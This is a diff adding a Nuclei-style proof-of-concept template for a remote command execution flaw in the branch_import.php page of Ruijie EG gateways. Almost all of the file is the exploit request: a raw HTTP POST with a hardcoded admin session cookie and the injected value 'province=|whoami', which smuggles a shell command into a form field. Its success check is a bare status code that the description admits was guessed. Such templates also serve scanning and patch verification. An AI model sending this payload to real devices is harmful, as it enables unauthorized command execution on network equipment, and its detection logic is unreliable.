@@ -1,0 +1,39 @@
+id: poc-d8ed71dd4b2d19eb6b37
+info:
+  name: 锐捷EG易网关branch_import存在后台远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d8ed71dd4b2d19eb6b37ee12c6de1180
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d8ed71dd4b2d19eb6b37ee12c6de1180
+http:
+- raw:
+  - 'POST /itbox_pi/branch_import.php?a=branch_list HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=ihvlofd9j5bfjbikfrtng7p9f5; helpKey=home_sys;user=admin
+
+    X-Requested-With: XMLHttpRequest
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-Length: 16
+
+
+    province=|whoami'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
